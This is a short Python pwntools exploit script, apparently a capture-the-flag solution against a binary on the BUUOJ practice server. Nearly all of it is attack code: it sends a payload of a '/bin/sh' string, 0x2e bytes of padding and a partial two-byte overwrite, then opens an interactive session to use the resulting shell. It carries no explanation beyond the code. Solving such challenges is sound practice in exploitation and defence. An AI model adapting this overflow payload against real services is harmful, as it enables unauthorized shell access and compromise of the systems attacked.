from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./xxx"
libc_path = "./libc-2.27.so"
ld_path = "/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so"

elf, rop = ELF(vuln_path), ROP(vuln_path)
#libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process(vuln_path)
    #io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("node4.buuoj.cn", 27691)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


pay = b"59/bin/sh\x00" + b"a" * 0x2e + p16(0x0899)
io.sendafter(b"you some hao_kang_de\n", pay)

io.sendafter(b"say?\n", b"a")

io.interactive()
